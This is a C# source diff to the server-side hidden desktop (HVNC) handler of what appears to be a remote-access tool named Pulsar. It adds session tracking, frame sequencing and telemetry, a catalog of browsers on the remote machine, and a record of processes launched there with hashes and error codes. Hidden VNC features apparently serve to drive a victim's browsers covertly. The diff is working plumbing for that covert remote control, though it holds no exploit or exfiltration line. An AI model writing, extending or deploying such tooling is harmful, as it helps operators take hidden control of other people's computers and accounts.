@@ -13,6 +13,8 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Collections.Concurrent;
 using Pulsar.Common.Messages.Monitoring.HVNC;
+using System.Collections.Generic;
+using System.Linq;
 
 namespace Pulsar.Server.Messages
 {
@@ -21,6 +23,17 @@ namespace Pulsar.Server.Messages
     /// </summary>
     public class HVNCHandler : MessageProcessorBase<Bitmap>, IDisposable
     {
+        public string SessionId { get; private set; } = string.Empty;
+        public long FrameSequence { get; private set; }
+
+        public event Action<HVNCProcessStatus> ProcessStatusChanged;
+        public event Action<HVNCBrowserDefinition[]> BrowserCatalogChanged;
+
+        private HVNCBrowserDefinition[] _browserCatalog = new HVNCBrowserDefinition[0];
+        public HVNCBrowserDefinition[] BrowserCatalog => _browserCatalog;
+        private readonly List<HVNCLaunchRecord> _launchHistory = new List<HVNCLaunchRecord>();
+        private readonly object _launchHistoryLock = new object();
+        public IReadOnlyList<HVNCLaunchRecord> LaunchHistory => _launchHistory;
         /// <summary>
         /// States if the client is currently streaming desktop frames.
         /// </summary>
@@ -110,6 +123,10 @@ namespace Pulsar.Server.Messages
         private long _accumulatedFrameBytes = 0;
         private int _frameBytesSamples = 0;
         private long _lastFrameBytes = 0;
+        private int _droppedFrames = 0;
+        private int _staleFrames = 0;
+        private int _maximumBacklog = 0;
+        private long _lastFrameTimestamp = 0;
 
         private bool _disposed;
 
@@ -137,6 +154,31 @@ namespace Pulsar.Server.Messages
         /// Shows the estimated frames per second (FPS) based on the last second of received frames.
         /// </summary>
         public float LastReportedFps => _lastReportedFps;
+        public HVNCFrameTelemetry GetFrameTelemetry(string sessionId)
+        {
+            var backlog = Math.Max(0, Volatile.Read(ref _pendingFrames));
+            if (backlog > Volatile.Read(ref _maximumBacklog))
+                Interlocked.Exchange(ref _maximumBacklog, backlog);
+
+            var now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
+            var frameAge = now - _lastFrameTimestamp;
+            if (frameAge < 0)
+                frameAge = 0;
+
+            return new HVNCFrameTelemetry
+            {
+                SessionId = sessionId,
+                FrameSequence = FrameSequence,
+                CurrentBacklog = backlog,
+                MaximumBacklog = Volatile.Read(ref _maximumBacklog),
+                DroppedFrames = Volatile.Read(ref _droppedFrames),
+                StaleFrames = Volatile.Read(ref _staleFrames),
+                CaptureFps = _lastReportedFps,
+                RenderFps = _estimatedFps,
+                EndToEndMilliseconds = frameAge,
+                MaximumFrameAgeMilliseconds = frameAge
+            };
+        }
 
         public static Size resolution = new Size(0, 0);
 
@@ -151,7 +193,12 @@ namespace Pulsar.Server.Messages
         }
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetHVNCDesktopResponse || message is GetHVNCMonitorsResponse;
+        public override bool CanExecute(IMessage message) =>
+            message is GetHVNCDesktopResponse ||
+            message is GetHVNCMonitorsResponse ||
+            message is GetHVNCBrowserCatalogResponse ||
+            message is GetHVNCLaunchHistoryResponse ||
+            message is HVNCProcessStatus;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
@@ -167,14 +214,42 @@ namespace Pulsar.Server.Messages
                 case GetHVNCMonitorsResponse response:
                     Execute(sender, response);
                     break;
+                case HVNCProcessStatus status:
+                    Execute(sender, status);
+                    break;
+                case GetHVNCBrowserCatalogResponse catalog:
+                    Execute(sender, catalog);
+                    break;
+                case GetHVNCLaunchHistoryResponse history:
+                    Execute(sender, history);
+                    break;
             }
         }
 
         private async void Execute(ISender client, GetHVNCDesktopResponse message)
         {
+            if (!string.IsNullOrEmpty(message.SessionId)
+                && !string.Equals(message.SessionId, SessionId, StringComparison.Ordinal))
+            {
+                Interlocked.Increment(ref _staleFrames);
+                return;
+            }
+
+            if (message.FrameSequence < FrameSequence)
+            {
+                Interlocked.Increment(ref _staleFrames);
+                return;
+            }
+
+            FrameSequence = message.FrameSequence + 1;
             _framesReceived++;
 
             resolution = new Size { Height = message.Resolution.Height, Width = message.Resolution.Width };
+            Interlocked.Exchange(
+                ref _lastFrameTimestamp,
+                message.Timestamp > 0
+                    ? message.Timestamp
+                    : DateTimeOffset.UtcNow.ToUnixTimeMilliseconds());
 
             // capture the FPS reported by the client
             if (message.Fps > 0)
@@ -234,6 +309,10 @@ namespace Pulsar.Server.Messages
                 while (_frameTimestamps.Count > _fpsCalculationWindow && _frameTimestamps.TryDequeue(out _)) { }
 
                 Interlocked.Decrement(ref _pendingFrames);
+                if (Volatile.Read(ref _pendingFrames) < 0)
+                {
+                    Interlocked.Exchange(ref _pendingFrames, 0);
+                }
             }
 
             if (IsBufferedMode && (message.IsLastRequestedFrame || _pendingFrames <= 1))
@@ -245,6 +324,78 @@ namespace Pulsar.Server.Messages
         private void Execute(ISender client, GetHVNCMonitorsResponse message)
         {
             OnDisplaysChanged(message.Number);
+        }
+
+        private void Execute(ISender client, HVNCProcessStatus message)
+        {
+            if (!string.IsNullOrEmpty(message.SessionId)
+                && !string.Equals(message.SessionId, SessionId, StringComparison.Ordinal))
+            {
+                return;
+            }
+
+            SynchronizationContext.Post(val =>
+            {
+                var status = (HVNCProcessStatus)val;
+                lock (_launchHistoryLock)
+                {
+                    var existing = _launchHistory.FirstOrDefault(record =>
+                        record.LaunchId == status.LaunchId);
+                    if (existing == null)
+                    {
+                        existing = new HVNCLaunchRecord
+                        {
+                            SessionId = status.SessionId,
+                            LaunchId = status.LaunchId,
+                            Category = "HVNC",
+                            StartedUtcTicks = status.StartedUtcTicks,
+                            Stage = status.Stage
+                        };
+                        _launchHistory.Add(existing);
+                    }
+
+                    existing.Stage = status.Stage;
+                    existing.ProcessId = status.ProcessId;
+                    existing.ExecutableIdentity = status.ExecutableIdentity;
+                    existing.ExecutableHash = status.ExecutableHash;
+                    existing.ErrorCode = status.ErrorCode;
+                    existing.Retryable = status.Retryable;
+                    existing.CompletedUtcTicks = status.CompletedUtcTicks;
+                }
+
+                ProcessStatusChanged?.Invoke(status);
+            }, message);
+        }
+
+        private void Execute(ISender client, GetHVNCBrowserCatalogResponse message)
+        {
+            if (!string.IsNullOrEmpty(message.SessionId)
+                && !string.Equals(message.SessionId, SessionId, StringComparison.Ordinal))
+            {
+                return;
+            }
+
+            _browserCatalog = message.Browsers ?? new HVNCBrowserDefinition[0];
+            SynchronizationContext.Post(val =>
+            {
+                BrowserCatalogChanged?.Invoke((HVNCBrowserDefinition[])val);
+            }, _browserCatalog);
+        }
+
+        private void Execute(ISender client, GetHVNCLaunchHistoryResponse message)
+        {
+            if (!string.IsNullOrEmpty(message.SessionId)
+                && !string.Equals(message.SessionId, SessionId, StringComparison.Ordinal))
+            {
+                return;
+            }
+
+            lock (_launchHistoryLock)
+            {
+                _launchHistory.Clear();
+                foreach (var record in message.Records ?? new HVNCLaunchRecord[0])
+                    _launchHistory.Add(record);
+            }
         }
 
         /// <summary>
@@ -295,6 +446,8 @@ namespace Pulsar.Server.Messages
             lock (_syncLock)
             {
                 IsStarted = true;
+                SessionId = Guid.NewGuid().ToString("N");
+                FrameSequence = 0;
                 _codec?.Dispose();
                 _codec = null;
 
@@ -313,7 +466,8 @@ namespace Pulsar.Server.Messages
                     Status = RemoteDesktopStatus.Start,
                     UseGPU = useGPU,
                     IsBufferedMode = IsBufferedMode,
-                    FramesRequested = _initialFramesRequested
+                    FramesRequested = _initialFramesRequested,
+                    SessionId = SessionId
                 });
             }
         }
@@ -335,7 +489,11 @@ namespace Pulsar.Server.Messages
 
             Debug.WriteLine("HVNC session stopped");
 
-            _client.Send(new GetHVNCDesktop { Status = RemoteDesktopStatus.Stop });
+            _client.Send(new GetHVNCDesktop
+            {
+                Status = RemoteDesktopStatus.Stop,
+                SessionId = SessionId
+            });
         }
 
         /// <summary>
@@ -404,7 +562,8 @@ namespace Pulsar.Server.Messages
                 {
                     msg = message,
                     wParam = wParam,
-                    lParam = lParam
+                    lParam = lParam,
+                    SessionId = SessionId
                 });
             }
         }
@@ -427,7 +586,8 @@ namespace Pulsar.Server.Messages
                 {
                     msg = message,
                     wParam = wParam,
-                    lParam = lParam
+                    lParam = lParam,
+                    SessionId = SessionId
                 });
             }
         }
@@ -489,6 +649,11 @@ namespace Pulsar.Server.Messages
 
                 Debug.WriteLine($"Requesting {batchSize} more frames (pending: {_pendingFrames})");
                 Interlocked.Add(ref _pendingFrames, batchSize);
+                if (Volatile.Read(ref _pendingFrames) > 30)
+                {
+                    Interlocked.Increment(ref _droppedFrames);
+                    Interlocked.Exchange(ref _pendingFrames, 30);
+                }
                 _lastFrameRequest = DateTime.Now;
 
                 if (!_disposed)
@@ -500,7 +665,9 @@ namespace Pulsar.Server.Messages
                         DisplayIndex = _codec?.Monitor ?? 0,
                         Status = RemoteDesktopStatus.Continue,
                         IsBufferedMode = true,
-                        FramesRequested = batchSize
+                        FramesRequested = batchSize,
+                        SessionId = SessionId,
+                        FrameSequence = FrameSequence
                     });
                 }
             }
